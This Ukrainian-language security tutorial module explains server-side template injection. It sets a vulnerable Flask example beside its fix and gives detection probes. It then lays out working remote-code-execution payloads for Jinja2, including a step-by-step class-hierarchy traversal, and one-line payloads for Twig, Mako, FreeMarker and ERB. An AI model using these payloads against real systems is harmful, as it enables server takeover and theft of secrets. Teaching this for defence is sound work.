Модуль 13 — Server-Side Template Injection (SSTI)

Дізнайся, як необроблений користувацький ввід у шаблонізаторах може призвести до віддаленого виконання коду.

Коли шаблони стають виконанням коду

Шаблонізатори зустрічаються скрізь у веб-розробці. Кожного разу, коли ти бачиш сторінку з написом "Привіт, Алісо!" з твоїм справжнім ім'ям, цю сторінку, найімовірніше, згенерував шаблонізатор. Jinja2 у Python/Flask, Twig у PHP, ERB у Ruby on Rails, Handlebars у Node.js — усі вони роблять одне й те саме: беруть шаблон із змінними-заповнювачами та підставляють значення.

Проблема починається, коли розробник допускає тонку, але катастрофічну помилку: замість того, щоб передати користувацький ввід як змінну в шаблонізатор, він конкатенує його безпосередньо в шаблон. Це означає, що ввід користувача трактується не як дані — а як код шаблону. А код шаблону вміє набагато більше, ніж просто відображати текст.

SSTI — це ніби менш відомий родич SQL-ін'єкції. Патерн ідентичний: користувацький ввід потрапляє туди, де інтерпретується як код, а не як дані. Але якщо SQLi атакує базу даних, то SSTI атакує шаблонізатор — а через нього часто й увесь сервер.

Вразливий патерн

Ключове питання: користувацький ввід є частиною шаблону чи змінною, яка передається в шаблон?

Вразливий код — ввід стає шаблоном

from flask import Flask, request, render_template_string

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # DANGEROUS: user input is concatenated INTO the template
    template = f"Hello {name}! Welcome to our site."
    return render_template_string(template)

# If name = "{{7*7}}", the template becomes:
# "Hello {{7*7}}! Welcome to our site."
# Jinja2 evaluates {{7*7}} → the page shows "Hello 49!"

Безпечний код — ввід є змінною

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # SAFE: user input passed as a variable — never evaluated as template code
    return render_template_string("Hello {{ name }}!", name=name)

# If name = "{{7*7}}", the page shows "Hello {{7*7}}!"
# The curly braces are treated as literal text, not template syntax

Різниця — один рядок коду. У вразливій версії f-string вставляє користувацький ввід у рядок шаблону до того, як Jinja2 його побачить, тому Jinja2 вважає його кодом шаблону. У безпечній версії Jinja2 точно знає, які частини є кодом шаблону, а які — даними.

Виявлення SSTI

Перший крок в експлуатації SSTI — це його виявлення. Ти вводиш математичні вирази в різних синтаксисах шаблонізаторів і перевіряєш, чи сервер їх обчислює. Якщо ти надсилаєш {{7*7}} і на сторінці відображається 49, SSTI підтверджено.

ЗондОчікуваний результат при вразливостіДвижок(и)
{{7*7}}49Jinja2, Twig, Handlebars
{{7*'7'}}7777777Jinja2 конкретно (множення рядків у Python)
${7*7}49Mako, FreeMarker, Thymeleaf
<%= 7*7 %>49ERB (Ruby)
#{7*7}49Pug/Jade
${{7*7}}49Thymeleaf (Spring)
Універсальний зонд: Корисний універсальний тест — ${{7*7}}. Знак долара та подвійні фігурні дужки покривають синтаксис одразу кількох движків. Якщо у відповіді з'являється 49, ти знаєш, що SSTI існує. Конкретний синтаксис, який спрацював, підкаже тобі, який саме движок використовується.

Експлуатація Jinja2 — від арифметики до RCE

Гаразд, ти можеш змусити сервер обчислити 7*7. Це мило. Але як перейти від обчислення арифметики до виконання команд операційної системи? У Jinja2 (Python) ти експлуатуєш об'єктну модель Python, проходячи по ієрархії класів і знаходячи небезпечні класи.

Ось хід думок крок за кроком: 

# Step 1: Start with any Python object — an empty string works
{{ ''.__class__ }}
# Output: <class 'str'>
# We now have a reference to the str class

# Step 2: Go up the class hierarchy to the root "object" class
{{ ''.__class__.__mro__ }}
# Output: (<class 'str'>, <class 'object'>)
# __mro__ = Method Resolution Order — the inheritance chain

# Step 3: From "object", list ALL classes in the Python runtime
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Output: [<class 'type'>, <class 'weakref'>, ... HUNDREDS of classes]
# Every class that inherits from "object" is listed here

# Step 4: Find a class that can execute commands
# Look for subprocess.Popen, os._wrap_close, etc.
# The index varies by Python version — you need to find it

# Step 5: Execute a command
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id', shell=True, stdout=-1).communicate() }}
# Output: (b'uid=1000(app) gid=1000(app)\n', None)

Виглядає складно, але логіка проста: починаєш з будь-якого об'єкта, піднімаєшся до кореня ієрархії класів, перераховуєш усі доступні класи, знаходиш той, що може виконувати команди, і використовуєш його. Є коротші payload'и, які роблять те саме: 

# Shorter RCE payloads for Jinja2:
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
Пісочниця Jinja2: У Jinja2 є SandboxedEnvironment, який обмежує доступ до небезпечних атрибутів. Проте обходи пісочниці знаходили неодноразово — наприклад, доступ до __globals__ через неочевидні шляхи. Ніколи не покладайся на пісочницю як на єдиний захист. Справжнє рішення — ніколи не вставляти користувацький ввід у рядок шаблону.

SSTI за межами Jinja2

Інші шаблонізатори мають свої шляхи експлуатації:

  • Twig (PHP): {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  • Mako (Python): Використовує синтаксис ${} і має пряме виконання коду Python через <% import os; os.popen('id').read() %>
  • FreeMarker (Java): ${"freemarker.template.utility.Execute"?new()("id")}
  • ERB (Ruby): <%= system('id') %> — майже тривіально експлуатується, оскільки ERB безпосередньо виконує код Ruby
Наслідки: SSTI майже завжди призводить до Remote Code Execution (RCE). Звідти атакуючий може читати чутливі файли (/etc/passwd, секрети застосунку), витягувати змінні оточення (API-ключі, облікові дані бази даних), проникати у внутрішні сервіси, встановлювати бекдори або повністю захопити сервер. SSTI — це вразливість критичного рівня серйозності.
